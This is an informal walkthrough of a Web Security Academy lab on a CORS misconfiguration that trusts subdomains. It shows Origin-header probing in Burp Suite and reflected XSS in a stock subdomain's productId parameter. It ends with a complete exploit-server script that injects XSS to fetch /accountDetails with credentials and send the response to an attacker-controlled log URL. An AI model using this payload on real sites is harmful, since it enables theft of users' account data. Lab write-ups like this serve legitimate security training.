Task 3:
///Lab: CORS vulnerability with trusted insecure protocols///

Log in as wiener/peter, and check the requests in burpsuite. After you logged in, there is a /accountDetails request as we have seen it earlier. 
Add a line with Origin: First i've tried https:/xyz.hu -> did not get my desired line (Access-Control-Allow-Origin:), tried null, same result.
The lab says that 'insecure CORS configuration in that it trusts all subdomains'. so i checked this:
Origin: https://asd.0a04004a0463212f80c303c9002d00c9.web-security-academy.net
and we got: Access-Control-Allow-Origin: https://asd.0a04004a0463212f80c303c9002d00c9.web-security-academy.net
So this site has a subdomain weakness. so lets find any subdomain on the site. And if you check the stock, a new window will pop up with the following url:
https://stock.0a04004a0463212f80c303c9002d00c9.web-security-academy.net/?productId=1&storeId=2
The lab says that we have to play with this subdomain : " you'll need to find an alternative way of injecting JavaScript into the subdomain."
This will be probably an XSS attack in the url. So lets check the request for this stock:
GET /?productId=1&storeId=2 HTTP/2
Host: stock.0a04004a0463212f80c303c9002d00c9.web-security-academy.net
Cookie: session=NYaLoHdRckGBPsP6I3RfPKqiD9Tch1os
....
...
So we can modify the product id or the store id. Lets modify the product id first. If we type <u>proba</u> into the url as a result we should see a underlined "proba" word in the response, and with the following 
url: GET /?productId=2<u>proba</u>&storeId=2 HTTP/2 we will get this as result: <h4>ERROR</h4>Invalid product ID: 2<u>proba</u> sou our payload get out as an error, so its vulnerable to XSS.
So this side doesnt filtering the HTML tags...Now go to exploit server, and copy into the body part:
<script>
    var labId = "0a04004a0463212f80c303c9002d00c9.web-security-academy.net";
    var exploitId = "exploit-0aff00d9044a21c080d702d901750006.exploit-server.net";

    var xss = "<script>" +
        "var x = new XMLHttpRequest();" +
        "x.onreadystatechange = function() {" +
            "if (x.readyState == 4) {" +
                "fetch('https://' + '" + exploitId + "' + '/log?key=' + encodeURIComponent(x.responseText));" +
            "}" +
        "};" +
        "x.open('GET', 'https://' + '" + labId + "' + '/accountDetails', true);" +
        "x.withCredentials = true;" +
        "x.send();" +
    "<\/script>";

    var targetUrl = "http://stock." + labId + "/?productId=" + encodeURIComponent(xss) + "&storeId=1";

    location = targetUrl;
</script>
